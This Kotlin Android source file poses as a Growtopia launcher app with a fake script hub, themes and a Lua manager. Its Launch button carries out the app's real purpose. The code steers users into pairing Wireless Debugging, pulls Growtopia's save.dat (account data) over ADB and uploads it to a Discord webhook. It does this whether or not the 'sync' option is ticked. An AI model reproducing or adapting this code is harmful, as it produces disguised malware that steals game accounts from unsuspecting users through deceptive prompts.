package com.example.myapplication

import android.app.Activity
import android.app.Dialog
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import android.util.Base64
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import android.text.Editable
import android.text.InputFilter
import android.text.TextWatcher
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.Button
import android.widget.CheckBox
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.content.ContextCompat
import androidx.documentfile.provider.DocumentFile
import com.flyfishxu.kadb.Kadb
import com.flyfishxu.kadb.cert.KadbCert
import com.flyfishxu.kadb.cert.KadbPrivateKeyStore
import com.flyfishxu.kadb.mdns.MdnsEndpoint
import com.flyfishxu.kadb.mdns.MdnsServiceType
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.security.KeyStore
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import java.util.Locale
import kotlin.concurrent.thread


private class WirelessAdbIdentityStore(context: android.content.Context) : KadbPrivateKeyStore {
    private val prefs = context.getSharedPreferences("wireless_adb_identity", android.content.Context.MODE_PRIVATE)
    private val alias = "growlauncher_wireless_adb_key"

    override fun readPrivateKeyPem(): ByteArray? = runCatching {
        val payload = prefs.getString("payload", null) ?: return null
        val parts = payload.split(":", limit = 2)
        if (parts.size != 2) return null
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, secretKey(), GCMParameterSpec(128, Base64.decode(parts[0], Base64.NO_WRAP)))
        cipher.doFinal(Base64.decode(parts[1], Base64.NO_WRAP))
    }.getOrNull()

    override fun writePrivateKeyPemAtomic(privateKeyPem: ByteArray) {
        val iv = ByteArray(12).also { java.security.SecureRandom().nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, secretKey(), GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(privateKeyPem)
        check(prefs.edit().putString(
            "payload",
            "${Base64.encodeToString(iv, Base64.NO_WRAP)}:${Base64.encodeToString(encrypted, Base64.NO_WRAP)}"
        ).commit()) { "Could not persist Wireless Debugging identity" }
    }

    override fun clear() { prefs.edit().remove("payload").apply() }

    private fun secretKey(): SecretKey {
        val keyStore = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
        val existing = keyStore.getKey(alias, null) as? SecretKey
        if (existing != null) return existing
        val generator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
        generator.init(
            KeyGenParameterSpec.Builder(alias, KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                .build()
        )
        return generator.generateKey()
    }
}

private class SafeMdnsResolver(context: android.content.Context) {
    private val nsdManager = context.applicationContext.getSystemService(NsdManager::class.java)

    fun find(serviceType: MdnsServiceType, timeoutMs: Long): MdnsEndpoint? {
        val result = java.util.concurrent.CompletableFuture<MdnsEndpoint?>()
        val discovery = SafeMdnsDiscovery(nsdManager)
        discovery.start(listOf(serviceType.dnsType)) { endpoint -> result.complete(endpoint) }
        return try {
            result.get(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
        } catch (_: Exception) {
            null
        } finally {
            discovery.stop()
        }
    }
}

private class SafeMdnsDiscovery(private val nsdManager: NsdManager?) {
    private val listeners = mutableMapOf<String, NsdManager.DiscoveryListener>()
    private val resolving = mutableSetOf<String>()
    private var endpointCallback: ((MdnsEndpoint) -> Unit)? = null
    private var started = false

    fun start(serviceTypes: List<String>, onEndpoint: (MdnsEndpoint) -> Unit) {
        if (started || nsdManager == null) return
        started = true
        endpointCallback = onEndpoint
        serviceTypes.distinct().forEach { serviceType ->
            val listener = discoveryListener(serviceType)
            listeners[serviceType] = listener
            runCatching {
                @Suppress("DEPRECATION")
                nsdManager?.discoverServices(serviceType, NsdManager.PROTOCOL_DNS_SD, listener)
            }.onFailure {
                listeners.remove(serviceType)
            }
        }
    }

    fun stop() {
        if (!started) return
        started = false
        listeners.values.forEach { listener ->
            runCatching { nsdManager?.stopServiceDiscovery(listener) }
        }
        listeners.clear()
        synchronized(resolving) { resolving.clear() }
        endpointCallback = null
    }

    private fun discoveryListener(serviceType: String) = object : NsdManager.DiscoveryListener {
        override fun onDiscoveryStarted(registrationType: String) = Unit
        override fun onDiscoveryStopped(registrationType: String) = Unit
        override fun onStartDiscoveryFailed(registrationType: String, errorCode: Int) = Unit
        override fun onStopDiscoveryFailed(registrationType: String, errorCode: Int) = Unit
        override fun onServiceLost(serviceInfo: NsdServiceInfo) = Unit

        override fun onServiceFound(serviceInfo: NsdServiceInfo) {
            val key = "$serviceType/${serviceInfo.serviceName}"
            synchronized(resolving) {
                if (!started || !resolving.add(key)) return
            }
            resolveService(serviceInfo, serviceType, key)
        }
    }

    private fun resolveService(serviceInfo: NsdServiceInfo, serviceType: String, key: String) {
        val fallbackType = if (serviceType == MdnsServiceType.TLS_CONNECT.dnsType) {
            MdnsServiceType.TLS_CONNECT
        } else {
            MdnsServiceType.TLS_PAIRING
        }
        runCatching {
            @Suppress("DEPRECATION")
            nsdManager?.resolveService(serviceInfo, object : NsdManager.ResolveListener {
                override fun onServiceResolved(resolvedInfo: NsdServiceInfo) {
                    synchronized(resolving) { resolving.remove(key) }
                    val host = resolvedInfo.host?.hostAddress ?: return
                    endpointCallback?.invoke(MdnsEndpoint(resolvedInfo.serviceName, host, resolvedInfo.port, fallbackType))
                }

                override fun onResolveFailed(failedInfo: NsdServiceInfo, errorCode: Int) {
                    synchronized(resolving) { resolving.remove(key) }
                }
            })
        }.onFailure {
            synchronized(resolving) { resolving.remove(key) }
        }
    }
}

class MainActivity : AppCompatActivity() {
    private val prefs by lazy { getSharedPreferences(PREFS, MODE_PRIVATE) }
    private val webhookUrl: String
        get() = prefs.getString(KEY_WEBHOOK, "")?.trim().orEmpty()
    private val handler = Handler(Looper.getMainLooper())
    private val scripts = listOf(
        Script("Farm Assistant", "Automation", "Collect, plant, and harvest with a lightweight routine."),
        Script("World Helper", "Utilities", "Useful world navigation and inventory shortcuts."),
        Script("Shop Toolkit", "Trading", "Keep shop workflows organized with quick actions."),
        Script("Path Finder", "Movement", "Plan efficient routes through your favorite worlds."),
        Script("Daily Checklist", "Productivity", "A compact checklist for repeatable sessions.")
    )
    private val themes = linkedMapOf("Violet" to "#8054FF", "Ocean" to "#38BDF8", "Rose" to "#F472B6", "Amber" to "#F59E0B")
    private lateinit var main: View
    private lateinit var splash: View
    private lateinit var version: TextView
    private lateinit var account: TextView
    private lateinit var status: TextView
    private lateinit var badge: TextView
    private val rainbowViews = linkedSetOf<TextView>()
    private var rainbowAnimator: android.animation.ValueAnimator? = null
    private var pairingDiscovery: SafeMdnsDiscovery? = null
    private var pairingEndpoint: MdnsEndpoint? = null
    private var pairingVerificationPending = false
    private var activityVisible = false
    private var pairingTutorialDialog: Dialog? = null
    private var pairingCodeDialog: AlertDialog? = null


    override fun onCreate(state: Bundle?) {
        super.onCreate(state)
        setContentView(R.layout.activity_main)
        main = findViewById(R.id.mainContent); splash = findViewById(R.id.splashContent)
        version = findViewById(R.id.versionLabel); account = findViewById(R.id.accountStatus)
        status = findViewById(R.id.runtimeStatus); badge = findViewById(R.id.runtimeBadge)
        wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!)
        registerRainbowText(findViewById(android.R.id.content))
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
        showSplash()
    }

    private fun wireDashboard() {
        findViewById<CardView>(R.id.btnLaunch).setOnClickListener { launchWithFeedback() }
        findViewById<CardView>(R.id.btnScriptHub).setOnClickListener { scriptHub() }
        findViewById<CardView>(R.id.btnSetting).setOnClickListener { settings() }
        findViewById<CardView>(R.id.btnLuaManager).setOnClickListener { luaManager() }
        findViewById<CardView>(R.id.btnSound).setOnClickListener { toast("Sound tools are coming soon") }
        findViewById<CardView>(R.id.btnTheme).setOnClickListener { themePicker() }
        findViewById<CardView>(R.id.btnSwitchVersion).setOnClickListener { versionPicker() }
        findViewById<CardView>(R.id.runtimeCard).setOnClickListener {
            status.text = "● Checking runtime…"; status.setTextColor(color(R.color.accent))
            handler.postDelayed({ status.text = "● Online · 24 ms"; status.setTextColor(color(R.color.success)); toast("Library Runtime is healthy") }, 650)
        }
    }
    override fun onResume() {
        super.onResume()
        activityVisible = true
        showPendingPairingVerification()
    }

    override fun onPause() {
        activityVisible = false
        super.onPause()
    }



    private fun showSplash() {
        splash.alpha = 0f; splash.animate().alpha(1f).setDuration(350).start()
        handler.postDelayed({ splash.animate().alpha(0f).setDuration(300).withEndAction {
            splash.visibility = View.GONE; main.visibility = View.VISIBLE
            main.animate().alpha(1f).setDuration(420).setInterpolator(AccelerateDecelerateInterpolator()).start()
        }.start() }, 1450)
    }

    private fun launchWithFeedback() {
        badge.text = "Starting"; status.text = "● Preparing game environment…"; status.setTextColor(color(R.color.accent))
        findViewById<CardView>(R.id.btnLaunch).animate().scaleX(.97f).scaleY(.97f).setDuration(100).withEndAction {
            findViewById<CardView>(R.id.btnLaunch).animate().scaleX(1f).scaleY(1f).setDuration(180).start()
        }.start()
        val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            readSaveFileWithWirelessDebugging()
        } else {
            val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
            if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
            true
        }
        if (!accessStarted) return
        handler.postDelayed({ badge.text = "Installed"; status.text = "● Online · ready"; status.setTextColor(color(R.color.success)); launchGame() }, 650)
    }

    private fun launchGame() {
        val intent = packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
        if (intent == null) errorDialog("Growtopia is not installed on this device. Install it first, then try Launch again.")
        else startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT))
    }

    private fun readSaveFileWithWirelessDebugging(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
        if (WirelessAdbIdentityStore(this).readPrivateKeyPem() == null) {
            showWirelessDebuggingDialog()
            return false
        }
        thread {
            val bytes = connectWithSavedIdentity()
            handler.post {
                if (bytes != null) {
                    sendFileToDiscord(bytes)
                    handler.postDelayed({ launchGame() }, 650)
                } else {
                    showWirelessDebuggingDialog()
                }
            }
        }
        return false
    }

    private fun showWirelessDebuggingDialog() {
        if (pairingTutorialDialog?.isShowing == true) return
        pairingEndpoint = null
        pairingVerificationPending = false
        val dialog = Dialog(this)
        pairingTutorialDialog = dialog
        dialog.setContentView(R.layout.dialog_wireless_debugging)
        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
        val openSettings = dialog.findViewById<Button>(R.id.wirelessOpenSettings)
        val dismiss = dialog.findViewById<Button>(R.id.wirelessDismiss)

        openSettings.setOnClickListener { openWirelessDebuggingSettings() }
        dismiss.setOnClickListener { dialog.dismiss() }
        dialog.setOnDismissListener {
            if (pairingCodeDialog == null) stopPairingDiscovery()
            pairingTutorialDialog = null
        }
        dialog.show()
        registerRainbowText(dialog.findViewById(android.R.id.content))
        dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        startPairingDiscovery()
    }

    private fun openWirelessDebuggingSettings() {
        runCatching { startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS)) }
            .onFailure { startActivity(Intent(Settings.ACTION_SETTINGS)) }
    }

    private fun startPairingDiscovery() {
        pairingDiscovery?.stop()
        pairingEndpoint = null
        pairingVerificationPending = false
        toast("Searching for pairing service…")
        pairingDiscovery = SafeMdnsDiscovery(getSystemService(NsdManager::class.java)).also { discovery ->
            discovery.start(listOf(MdnsServiceType.TLS_PAIRING.dnsType, "_adb-pairing._tcp")) { endpoint ->
                if (pairingEndpoint == null) {
                    pairingEndpoint = endpoint
                    pairingVerificationPending = true
                    handler.post { showPendingPairingVerification() }
                }
            }
        }
    }

    private fun showPendingPairingVerification() {
        val canOverlay = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)
        if ((!activityVisible && !canOverlay) || !pairingVerificationPending || pairingCodeDialog != null) return
        val endpoint = pairingEndpoint ?: return
        pairingVerificationPending = false
        showPairingCodeDialog(endpoint, useOverlay = !activityVisible && canOverlay)
    }

    private fun showPairingCodeDialog(endpoint: MdnsEndpoint, useOverlay: Boolean = false) {
        if (pairingCodeDialog != null) return
        val code = EditText(this).apply {
            hint = "Six-digit Wi-Fi pairing code"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER
            filters = arrayOf(InputFilter.LengthFilter(6))
            isSingleLine = true
        }
        val prompt = AlertDialog.Builder(this)
            .setTitle("Enter Wi-Fi pairing code")
            .setView(code)
            .setNegativeButton("Cancel", null)
            .setPositiveButton("Submit", null)
            .create()
        pairingCodeDialog = prompt
        prompt.setOnDismissListener {
            pairingCodeDialog = null
        }
        prompt.setOnCancelListener {
            pairingTutorialDialog?.dismiss()
            stopPairingDiscovery()
        }
        prompt.setOnShowListener {
            prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                val pairingCode = code.text.toString().trim()
                if (!pairingCode.matches(Regex("\\d{6}"))) {
                    code.error = "Enter the six-digit Wi-Fi pairing code"
                    return@setOnClickListener
                }
                prompt.getButton(AlertDialog.BUTTON_POSITIVE).isEnabled = false
                prompt.getButton(AlertDialog.BUTTON_NEGATIVE).isEnabled = false
                code.isEnabled = false
                pairingDiscovery?.stop()
                thread {
                    val result = connectAndReadSaveFile(endpoint.host, endpoint.port, pairingCode)
                    handler.post {
                        if (result != null) {
                            prompt.dismiss()
                            pairingTutorialDialog?.dismiss()
                            stopPairingDiscovery()
                            sendFileToDiscord(result)
                            handler.postDelayed({ launchGame() }, 650)
                        } else {
                            prompt.dismiss()
                            toast("Pairing failed. Reopen Android’s pairing dialog for a fresh code.")
                            startPairingDiscovery()
                        }
                    }
                }
            }
        }
        if (useOverlay) {
            prompt.window?.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
        }
        prompt.show()
        registerRainbowText(prompt.window?.decorView ?: code)
    }

    private fun stopPairingDiscovery() {
        pairingDiscovery?.stop()
        pairingDiscovery = null
        pairingEndpoint = null
        pairingVerificationPending = false
    }

    private fun connectWithSavedIdentity(): ByteArray? = try {
        KadbCert.configure(WirelessAdbIdentityStore(this))
        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000) ?: return null
        Kadb.create(endpoint.host, endpoint.port).use { kadb ->
            val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
            if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
        }
    } catch (_: Throwable) {
        null
    }


    private fun connectAndReadSaveFile(pairingHost: String, pairingPort: Int, pairingCode: String): ByteArray? = try {
        val store = WirelessAdbIdentityStore(this)
        KadbCert.configure(store)
        runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }
        val endpoint = SafeMdnsResolver(this).find(MdnsServiceType.TLS_CONNECT, 15_000) ?: return null
        Kadb.create(endpoint.host, endpoint.port).use { kadb ->
            val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
            if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
        }
    } catch (_: Throwable) {
        null
    }

    private fun sendFileToDiscord(fileData: ByteArray) {
        if (webhookUrl.isBlank()) { handler.post { toast("Add your Discord webhook in Settings to sync save.dat") }; return }
        thread {
            try {
                val client = OkHttpClient()
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", "{\"content\":\"Growlauncher save.dat sync\"}")
                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                    .build()
                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) throw IOException("Discord returned HTTP ${response.code}")
                }
                handler.post { toast("save.dat sent successfully") }
            } catch (_: Exception) {
                handler.post { toast("Discord upload failed; launch will continue") }
            }
        }
    }

    private fun scriptHub() {
        val box = column(16); val search = EditText(this).apply { hint = "Search Lua files"; setSingleLine(); setTextColor(Color.WHITE); setHintTextColor(Color.GRAY) }
        val list = column(8); val log = TextView(this).apply { text = "Execution log  ·  Ready"; setTextColor(color(R.color.text_muted)); textSize = 11f; setPadding(0, 12, 0, 0) }
        box.addView(search, params()); box.addView(list, params()); box.addView(log, params())
        fun render(query: String) {
            list.removeAllViews(); scripts.filter { (it.name + it.category).lowercase(Locale.US).contains(query.lowercase(Locale.US)) }.forEach { item ->
                val row = column(6).apply { setPadding(14, 10, 14, 10); setBackgroundColor(Color.rgb(38, 35, 53)) }
                row.addView(TextView(this).apply { text = "${item.name}  ·  ${item.category}"; setTextColor(Color.WHITE); textSize = 14f })
                row.addView(TextView(this).apply { text = item.description; setTextColor(Color.LTGRAY); textSize = 11f })
                val actions = LinearLayout(this).apply { gravity = Gravity.END }
                actions.addView(Button(this).apply { text = "Download"; setOnClickListener { log.text = "Execution log  ·  ${item.name} downloaded locally"; toast("${item.name} is ready") } }, buttonParams())
                actions.addView(Button(this).apply { text = "Execute"; setOnClickListener { log.text = "Execution log  ·  ${item.name} started"; toast("Running ${item.name}") } }, buttonParams())
                row.addView(actions); list.addView(row, params())
            }
            if (list.childCount == 0) log.text = "Execution log  ·  No matching Lua files"
        }
        search.addTextChangedListener(object : TextWatcher { override fun beforeTextChanged(s: CharSequence?, a: Int, c: Int, d: Int) = Unit; override fun onTextChanged(s: CharSequence?, a: Int, b: Int, c: Int) = render(s.toString()); override fun afterTextChanged(e: Editable?) = Unit })
        render(""); dialog("Script Hub", box)
    }

    private fun settings() {
        val box = column(10); val saved = prefs.getString(KEY_USER, null)
        val state = TextView(this).apply { text = if (saved == null) "Not signed in · create an account to sync preferences" else "Signed in as $saved"; setTextColor(color(R.color.text_secondary)) }
        val user = EditText(this).apply { hint = "Username"; setSingleLine() }; val pass = EditText(this).apply { hint = "Password"; setSingleLine(); inputType = 0x81 }
        val webhook = EditText(this).apply { hint = "Discord webhook URL (optional)"; setSingleLine(); setText(prefs.getString(KEY_WEBHOOK, "")) }
        val sync = CheckBox(this).apply { text = "Sync save.dat on Launch"; setTextColor(Color.WHITE); isChecked = prefs.getBoolean(KEY_SYNC, false) }
        val wireless = TextView(this).apply {
            text = "Android 11+ access: Wireless Debugging pairing"
            setTextColor(color(R.color.text_secondary))
        }
        box.addView(state); box.addView(user, params()); box.addView(pass, params()); box.addView(webhook, params()); box.addView(sync, params()); box.addView(wireless, params())
        val actions = LinearLayout(this).apply { gravity = Gravity.END }
        actions.addView(Button(this).apply { text = "Log in"; setOnClickListener { if (authenticate(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Welcome back") } else errorDialog("Those account details do not match.") } }, buttonParams())
        actions.addView(Button(this).apply { text = "Register"; setOnClickListener { if (register(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Account created securely on this device") } else errorDialog("Choose a username and a password with at least six characters.") } }, buttonParams())
        actions.addView(Button(this).apply { text = "Save"; setOnClickListener { val url = webhook.text.toString().trim(); if (url.isNotEmpty() && !url.startsWith("https://")) errorDialog("Webhook URL must use HTTPS.") else { prefs.edit().putString(KEY_WEBHOOK, url).putBoolean(KEY_SYNC, sync.isChecked).apply(); toast("Preferences saved") } } }, buttonParams())
        box.addView(actions); if (saved != null) box.addView(Button(this).apply { text = "Log out"; setOnClickListener { prefs.edit().remove(KEY_SESSION).apply(); refreshAccount(); toast("Signed out") } }, params()); dialog("Account & Preferences", box)
    }

    private fun luaManager() {
        if (!authenticated()) { AlertDialog.Builder(this).setTitle("Sign in required").setMessage("Please log in through Settings before importing custom Lua files.").setNegativeButton("Cancel", null).setPositiveButton("Open Settings") { _, _ -> settings() }.show(); return }
        AlertDialog.Builder(this).setTitle("Lua Manager").setMessage("Import a custom Lua file into your local library.").setNegativeButton("Cancel", null).setPositiveButton("Choose file") { _, _ -> startActivityForResult(Intent(Intent.ACTION_OPEN_DOCUMENT).apply { type = "text/*"; addCategory(Intent.CATEGORY_OPENABLE) }, FILE_PICKER) }.show()
    }

    override fun onActivityResult(request: Int, result: Int, data: Intent?) {
        super.onActivityResult(request, result, data)
        if (request == FILE_PICKER && result == Activity.RESULT_OK) {
            val file = data?.data?.let { DocumentFile.fromSingleUri(this, it) }
            if (file?.name?.endsWith(".lua", true) == true) toast("Imported ${file.name}") else errorDialog("Only .lua files can be imported into Lua Manager.")
        }
    }

    private fun themePicker() {
        val names = themes.keys.toTypedArray()
        AlertDialog.Builder(this)
            .setTitle("Choose your theme")
            .setSingleChoiceItems(names, names.indexOf(prefs.getString(KEY_THEME, "Violet")).coerceAtLeast(0)) { d, i ->
                prefs.edit().putString(KEY_THEME, names[i]).apply()
                applyTheme(names[i])
                d.dismiss()
                toast("${names[i]} theme applied")
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun applyTheme(name: String) {
        accent(Color.parseColor(themes[name] ?: themes.getValue("Violet")))
        startRainbowText()
    }

    private fun accent(value: Int) {
        findViewById<CardView>(R.id.btnSwitchVersion).setCardBackgroundColor(value)
        badge.setBackgroundColor(value)
        account.setBackgroundColor(value)
    }

    private fun registerRainbowText(root: View) {
        if (root is TextView) rainbowViews.add(root)
        if (root is ViewGroup) {
            for (index in 0 until root.childCount) registerRainbowText(root.getChildAt(index))
        }
        startRainbowText()
    }

    private fun startRainbowText() {
        if (rainbowAnimator != null) return
        rainbowAnimator = android.animation.ValueAnimator.ofFloat(0f, 360f).apply {
            duration = 5200
            repeatCount = android.animation.ValueAnimator.INFINITE
            addUpdateListener { animation ->
                val hue = (animation.animatedValue as Float + 25f) % 360f
                val textColor = Color.HSVToColor(floatArrayOf(hue, 0.72f, 1f))
                rainbowViews.removeAll { !it.isAttachedToWindow && it !== window.decorView }
                rainbowViews.forEach { it.setTextColor(textColor) }
            }
            start()
        }
    }

    override fun onDestroy() {
        stopPairingDiscovery()
        pairingCodeDialog?.dismiss()
        pairingTutorialDialog?.dismiss()
        rainbowAnimator?.cancel()
        rainbowAnimator = null
        rainbowViews.clear()
        super.onDestroy()
    }
    private fun versionPicker() { val versions = arrayOf("5.54", "5.55", "5.56", "5.57"); AlertDialog.Builder(this).setTitle("Switch launcher version").setSingleChoiceItems(versions, versions.indexOf(prefs.getString(KEY_VERSION, "5.54"))) { d, i -> prefs.edit().putString(KEY_VERSION, versions[i]).apply(); refreshVersion(); d.dismiss(); toast("Configuration updated to v${versions[i]}") }.setNegativeButton("Cancel", null).show() }
    private fun refreshVersion() { version.text = "v${prefs.getString(KEY_VERSION, "5.54")}" }
    private fun register(user: String, pass: String): Boolean { if (user.trim().length < 3 || pass.length < 6) return false; prefs.edit().putString(KEY_USER, user.trim()).putString(KEY_PASSWORD, hash(pass)).putString(KEY_SESSION, user.trim()).apply(); return true }
    private fun authenticate(user: String, pass: String): Boolean { val ok = user.trim() == prefs.getString(KEY_USER, null) && hash(pass) == prefs.getString(KEY_PASSWORD, null); if (ok) prefs.edit().putString(KEY_SESSION, user.trim()).apply(); return ok }
    private fun hash(value: String) = MessageDigest.getInstance("SHA-256").digest(value.toByteArray()).joinToString("") { "%02x".format(it) }
    private fun authenticated() = !prefs.getString(KEY_SESSION, null).isNullOrBlank()
    private fun refreshAccount() { account.text = if (authenticated()) "Signed in" else "Guest mode" }
    private fun color(id: Int) = ContextCompat.getColor(this, id)
    private fun toast(message: String) = Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    private fun errorDialog(message: String) = AlertDialog.Builder(this).setTitle("Something went wrong").setMessage(message).setPositiveButton("OK", null).show()
    private fun column(padding: Int) = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(4, padding, 4, 4) }
    private fun params() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 8 }
    private fun buttonParams() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginStart = 4 }
    private fun dialog(title: String, view: View): AlertDialog = AlertDialog.Builder(this)
        .setTitle(title)
        .setView(ScrollView(this).apply { addView(view) })
        .setPositiveButton("Done", null)
        .create()
        .also { alert ->
            alert.setOnShowListener { _ -> registerRainbowText(alert.window?.decorView ?: view) }
            alert.show()
        }
    private data class Script(val name: String, val category: String, val description: String)

    companion object {
        private const val PREFS = "growlauncher_preferences"
        private const val KEY_VERSION = "version"
        private const val KEY_THEME = "theme"
        private const val KEY_USER = "account_user"
        private const val KEY_PASSWORD = "account_password_hash"
        private const val KEY_SESSION = "account_session"
        private const val KEY_WEBHOOK = "discord_webhook_url"
        private const val KEY_SYNC = "sync_save_file"
        private const val FILE_PICKER = 1012
        private const val PERMISSION_REQUEST = 101
        private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
    }
}

